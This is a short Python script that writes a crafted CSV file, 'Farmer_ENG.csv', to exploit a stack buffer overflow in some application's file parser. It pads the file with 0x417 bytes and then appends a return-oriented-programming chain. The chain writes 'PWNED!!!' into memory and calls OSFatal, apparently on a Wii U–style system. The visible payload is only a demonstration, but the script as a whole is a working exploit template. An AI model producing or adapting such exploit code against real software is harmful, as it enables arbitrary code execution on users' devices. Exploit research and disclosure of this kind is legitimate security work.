import sys
sys.path.append("..")
from common.ropgadgets import *

header = "Temp,,,,,\r\nNote,"
rawData = header.encode('cp1252')

# Create a long string to cause a stack overflow
rawData += b'\x20' * 0x417

# Add ropchain :) Make sure not to use '\0' inside the rop chain.
rop_chain = []
rop_chain += write32(0x100105ec,0x50574E45) # Write 'PWNE' to 0x0x100105ec
rop_chain += write32(0x100105f0,0x44212121) # Write 'D!!!' to 0x0x100105f0
rop_chain += OSFatal(0x100105ec)            # Call OSFatal((char*)0x100105ec)

for num in rop_chain:
    raw_bytes = num.to_bytes(4, byteorder='big')
    rawData += raw_bytes

file_path = r'Farmer_ENG.csv'

with open(file_path, 'wb') as file:
    # Write the rawData to the file
    file.write(rawData)